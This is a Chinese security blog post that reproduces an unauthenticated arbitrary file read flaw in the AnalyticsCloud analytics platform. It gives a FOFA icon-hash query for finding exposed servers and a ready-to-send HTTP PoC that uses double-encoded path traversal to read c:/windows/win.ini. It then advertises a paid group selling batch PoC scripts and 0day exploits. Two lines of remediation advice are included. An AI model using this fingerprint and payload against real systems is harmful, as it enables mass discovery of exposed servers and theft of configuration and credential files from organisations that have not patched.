#  「漏洞复现」AnalyticsCloud 分析云 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-07-24 18:53  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
AnalyticsCloud 分析云集成了先进的数据分析技术和工具，能够处理来自各种数据源的数据，包括云数据、本地数据、传统数据和大数据等。它提供了从数据收集、整理、分析到应用的全链路解决方案，帮助企业更好地理解和利用数据，从而优化业务流程、提升决策效率。  
  
0x03  
  
**漏洞威胁**  
  
AnalyticsCloud 分析云 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
icon_hash="888607769"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oHiclGEBTgquo8YOEKlUickf6Hiavrw2ApqjU3yibYAcP0PLNm2OCWib9coN5GSLtgEyw7od4dIT2BIiag/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oHiclGEBTgquo8YOEKlUickfibwv6KBZYJZia6g4sYNr6icbyjmE5iaq30KibdWrjhmvaX1NaiahPjVBcicuw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oHiclGEBTgquo8YOEKlUickfdOwRHQRiaJ1uZWnx5sm8MDibZHPMib85GScGgGs3R9T3rkEpWxpFYzicgA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oHiclGEBTgquo8YOEKlUickfhtiabxcicvAsKusBTUb55iamQ8IolENPYKtsniaYNibHTqHaRPrErQ8DFEA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oHiclGEBTgquo8YOEKlUickfBQLqicFu4icIVbOZZVtRyiaxic7iaA6d7n7GWibEaUDicEa5xoYuJogv2RHyg/640?wx_fmt=gif&from=appmsg "")  
  
  
